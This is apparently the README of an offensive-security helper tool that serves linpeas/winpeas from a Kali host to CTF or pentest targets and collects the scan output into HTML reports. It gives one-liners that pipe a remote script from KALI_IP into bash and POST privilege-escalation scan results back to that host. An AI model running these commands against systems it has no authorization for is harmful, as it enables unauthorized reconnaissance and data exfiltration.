# 🥒 ParsingPeas

**Automated linpeas/winpeas Output Transfer & Interactive HTML Parser**

ParsingPeas solves the annoying problem of manually transferring and parsing privilege escalation scan outputs. Run one command on the target, and automatically get a beautiful, searchable HTML report on your Kali host.

## Why ParsingPeas?

Existing PEASS parsers require manual file transfers (SCP, copy/paste, etc.), which breaks your workflow. ParsingPeas automates the entire pipeline:

```
🎯 Target → 🔄 Auto Transfer → 🖥️ Kali → 📊 Parse → 🌐 HTML Report
```

**Perfect for CTF environments** where target machines have no internet access - everything is served from your Kali host!

## Features

- ✅ **Automatic Transfer**: No manual file copying
- ✅ **Isolated Networks**: Works without internet on target (CTF-friendly)
- ✅ **Robust**: Handles large outputs, retries on failure
- ✅ **Interactive HTML**: Collapsible sections, search, highlighting
- ✅ **Critical Findings**: Auto-extracts important vulnerabilities
- ✅ **Multi-Session**: Handle multiple scans simultaneously
- ✅ **Clean**: Auto-removes temp files on target

## Quick Start

### 1. On Your Kali Host:

```bash
# Clone the repository
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas

# Download linpeas/winpeas scripts (requires internet)
./setup.sh

# Install Python dependencies
pip3 install -r requirements.txt

# Start the receiver
python3 receiver.py
```

The server will start on `http://0.0.0.0:8000`

> **Note:** The setup script downloads linpeas/winpeas to your Kali machine so you can serve them to isolated targets.

### 2. On Target Machine:

**One-liner (replace KALI_IP):**
```bash
curl -sSL http://KALI_IP:8000/get-script | bash
```

**Alternative (if piping not allowed):**
```bash
curl http://KALI_IP:8000/get-linpeas -o /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh | curl -X POST --data-binary @- -H "X-Hostname: $(hostname)" http://KALI_IP:8000/upload
```

That's it! The script will:
1. Download linpeas **from your Kali host** (no internet needed on target)
2. Run the scan
3. Transfer output to your Kali host
4. Generate an HTML report
5. Clean up after itself

### 3. View Report:

Open your browser to `http://KALI_IP:8000` to see all generated reports.

## How It Works (CTF-Friendly Architecture)

```
┌─────────────────┐
│  Your Kali      │  1. Run setup.sh (downloads linpeas/winpeas)
│                 │  2. Start receiver.py
│  ┌───────────┐  │
│  │ scripts/  │  │  ← linpeas.sh, winpeas.exe stored here
│  └───────────┘  │
└────────┬────────┘
         │
         │ Serves scripts via HTTP
         ↓
┌─────────────────┐
│  Target (CTF)   │  NO INTERNET ACCESS
│                 │
│  1. curl Kali   │  ← Downloads from YOUR Kali, not GitHub
│  2. Run script  │
│  3. POST output │  → Sends back to Kali
└─────────────────┘
```

## Architecture Flow

```
┌─────────────────┐
│  Target Machine │
│                 │
│  wrapper.sh     │
│  ├─ Download    │  ← FROM KALI HOST
│  ├─ Run linpeas │
│  └─ HTTP POST   │
└────────┬────────┘
         │
         │ Chunked Transfer
         │ with Retries
         ▼
┌─────────────────┐
│   Kali Host     │
│                 │
│  receiver.py    │
│  ├─ Serve files │  → /get-linpeas, /get-winpeas
│  ├─ Receive     │
│  ├─ Validate    │
│  └─ Trigger ────┐
└─────────────────┘
         │
         ▼
┌─────────────────┐
│   parser.py     │
│                 │
│  ├─ Parse       │
│  ├─ Extract     │
│  └─ Generate ───┐
└─────────────────┘
         │
         ▼
┌─────────────────┐
│  HTML Report    │
│  ├─ Searchable  │
│  ├─ Collapsible │
│  └─ Highlights  │
└─────────────────┘
```

## Manual Usage

### Run Linpeas and Transfer Manually:

```bash
# On target - download from Kali
curl http://KALI_IP:8000/get-linpeas -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

# Run and save output
/tmp/linpeas.sh > /tmp/output.txt

# Transfer to Kali
curl -X POST \
  -H "X-Hostname: $(hostname)" \
  -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/output.txt \
  http://KALI_IP:8000/upload
```

## Configuration

Edit `receiver.py` to customize:

- `OUTPUT_DIR`: Where raw outputs are saved (default: `./received_outputs`)
- `REPORTS_DIR`: Where HTML reports are generated (default: `./reports`)
- `SCRIPTS_DIR`: Where linpeas/winpeas are stored (default: `./scripts`)
- `MAX_UPLOAD_SIZE`: Maximum upload size (default: 500MB)
- Port: Change port in the last line (default: 8000)

## Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Status page with reports list |
| `/get-script` | GET | Get wrapper script |
| `/get-linpeas` | GET | Download linpeas.sh from Kali |
| `/get-winpeas` | GET | Download winpeas.exe from Kali |
| `/upload` | POST | Upload scan results |
| `/reports/<file>` | GET | View HTML report |
| `/health` | GET | Health check |

## Security Considerations

⚠️ **This tool is for authorized penetration testing only**

- The receiver has no authentication (use only in controlled environments)
- Run on isolated networks or VPN
- Consider adding authentication if needed for production use
- Firewall rules recommended: only allow target subnet access

## Troubleshooting

**Target can't download script:**
- Check Kali IP is reachable: `ping KALI_IP` from target
- Verify receiver is running: `curl http://KALI_IP:8000/health`
- Check firewall: `sudo ufw allow 8000` on Kali

**Scripts not found:**
- Run `./setup.sh` on Kali first to download scripts
- Or manually download to `./scripts/` directory

**Transfer fails:**
- Check output size (max 500MB by default)
- Verify network stability
- Check Kali disk space

## Roadmap

- [ ] Windows/WinPEAS support
- [ ] Better ANSI color parsing in HTML
- [ ] Integration with PEASS-ng JSON parsers
- [ ] Multi-language reports
- [ ] PDF export
- [ ] Diff comparison between multiple scans
- [ ] Authentication/encryption for production use
- [ ] Auto-open browser on report generation

## Contributing

Pull requests welcome! Areas that need work:
- WinPEAS wrapper implementation
- Enhanced HTML parsing and UI
- Better critical finding detection
- Performance optimizations

## License

MIT License - See LICENSE file

## Credits

Built on top of the excellent [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project by [carlospolop](https://github.com/carlospolop).

---

**Made with 🥒 for lazy pentesters who hate manual file transfers**
